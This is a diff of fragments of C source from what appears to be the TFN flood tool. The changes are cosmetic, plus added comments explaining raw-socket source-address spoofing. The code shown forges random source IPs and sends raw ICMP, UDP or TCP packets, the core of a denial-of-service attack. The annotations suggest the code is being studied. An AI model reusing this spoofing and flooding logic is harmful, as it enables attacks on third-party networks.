@@ -26,7 +26,6 @@ void random_init (void) {
     close (rfd);
 }
 
-//inline
 long getrandom (int min, int max) {
     if (rcounter < 2)
         random_init ();
@@ -42,7 +41,6 @@ void trimbuf (char *buf) {
             buf[i] = '\0';
 }
 
-//inline 
 unsigned long k00lip (void) {
     struct in_addr hax0r;
     char convi[16];
@@ -96,8 +94,7 @@ void tfntransmit (unsigned long from, unsigned long to, int proto, char id, char
     ih->src = from;
     ih->dst = to;
 
-    switch ((proto == -1) ? getrandom (0, 2) : proto)
-    {
+    switch ((proto == -1) ? getrandom (0, 2) : proto) {
         case 0:
             tot_len += sizeof (struct icmp);
             ih->pro = ICMP;
@@ -154,7 +151,14 @@ void tfntransmit (unsigned long from, unsigned long to, int proto, char id, char
             break;
     }
 
+    // ***warning*** : 
+    // if raw-sock set ip_hdrincl, user set the src.addr, else system set it with eth.addr;
+    // if raw-sock not call connect, uesr set dst.addr, else system set it.
+    // that's why setsockopt.
     setsockopt (ssock, IP, IP_HDRINCL, "1", sizeof ("1"));
+
+    // if not call connect; must use sendto, recvfrom
+    // that why here, --- sednto
     if (sendto (ssock, buf, tot_len, 0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
         perror ("sendto");
 
